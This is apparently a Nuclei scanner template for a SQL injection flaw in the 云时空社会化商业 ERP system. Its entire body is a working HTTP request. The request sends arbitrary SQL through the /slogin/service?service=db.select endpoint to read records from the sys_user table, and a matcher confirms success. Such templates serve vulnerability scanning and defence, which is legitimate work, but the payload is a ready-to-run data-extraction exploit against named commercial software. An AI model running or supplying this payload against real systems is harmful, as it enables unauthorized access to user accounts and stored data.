id: yskerp-service-sqli

info:
  name: yskerp-service-sqli
  author: HB
  severity: high
  description: 云时空社会化商业 ERP 系统 service SQL 注入


http:
  - raw:
    - |
      POST /slogin/service?service=db.select HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Content-Type: application/x-www-form-urlencoded
      Accept-Encoding: gzip
      Content-Length: 75

      params=%7B%22sql%22%3A%22select+%2A+from+sys_user+where+rownum+%3C+10%22%7D

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"value")'